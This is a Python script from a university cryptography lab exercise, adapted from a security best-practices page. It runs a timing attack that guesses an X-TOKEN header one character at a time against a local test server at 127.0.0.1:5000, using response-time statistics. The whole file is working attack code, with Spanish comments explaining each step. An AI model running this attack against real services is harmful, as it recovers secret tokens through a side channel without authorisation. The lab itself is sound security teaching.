"""
Laboratorio 3
Cifrado de información
#Maria Jose Castro 181202
#Diana de Leon 18607
#Camila Gonzalez 18398
#Maria Ines Vasquez 18250
#Christopher Barrios 18207
#Jose Garavito 18071
"""

#Ejercicio 2.2
#Codigo extraido de: https://sqreen.github.io/DevelopersSecurityBestPractices/timing-attack/python

import sys
import time
import string
import statistics

import requests

from operator import itemgetter

URL = 'http://127.0.0.1:5000/'
N = 100
TOKEN_SIZE = 3


class PasswordFound(Exception):
    
    def __init__(self,password):
        self.password = password

def try_to_hack(characters):
    timings=[]

    print('.',end='',flush=True)
    #aqui es el ciclo para poder llevar el timpo de cuando toma cada letra
    for i in range(N):
        before=time.perf_counter() #tiempo en segundos
        result =requests.get(URL,headers={'X-TOKEN':characters})
        after = time.perf_counter()
        #aqui nos mostrara si encontro los resultados 
        if result.status_code == 200:
            raise PasswordFound(characters)
        elif result.status_code != 403:
            raise Exception(result, result.status_code)
        timings.append(after - before)

    return timings

def find_next_character(base):
    measures =[]
    #Intenta encontrar el siguiente caracter 
    print('Trying to find the next character at position %s with prefix %r' % ((len(base)+1),base))
    for i, character in enumerate(string.ascii_lowercase):
        #Mide el tiempo tomado en hacer la verifucacion
        timings = try_to_hack(base + character + '0' * (TOKEN_SIZE - len(base) -1))
        #saca los valores de mediana, minimo y max de los tiempos
        median = statistics.median(timings)
        min_timing = min(timings)
        max_timing = max(timings)
        stddev = statistics.stdev(timings)
        #agrega los valores del tiepo a la lista
        measures.append({'character':character, 'median':median, 'min':min_timing,
                         'max':max_timing, 'stddev': stddev})
        sorted_measures = list(sorted(measures, key=itemgetter('median'), reverse=True)) #estos valores son ordenadso
        found_character = sorted_measures[0]
        top_characters = sorted_measures[1:4]
        #Aui nos dice cuando encuentr aun caracter
        print('Found character at position %s: %r' %((len(base)+1),found_character['character']))
        msg= 'median: %s max: %s Min: %s Stddev: %s'
        print(msg % (found_character['median'], found_character['max'], found_character['min'],found_character['stddev']))
        print()

    return found_character['character']

def main():
    requests.get(URL)

    base = ''

    #mientras los caracteres econtrados sean menos al largo del token
    try:
        while len(base) !=TOKEN_SIZE:
            #Se llama a la funcion para contrar el siguiente caracter
            next_character = find_next_character(base)
            #al encontrarlo lo agrega a la base 
            base += next_character
            print('\n\n',end='')
    except PasswordFound as e: #Sieencontro el token
        print('\n\n',end='')
        print('The token is: %r %s' % (e.password, '!'*10))
        sys.exit(0)

    else:
        #Si no logro encontrar la respuesta
        print('the password is not found, check the allowed character and token size')
        sys.exit(1)

if __name__=='__main__':
    main()
        
        
                
    
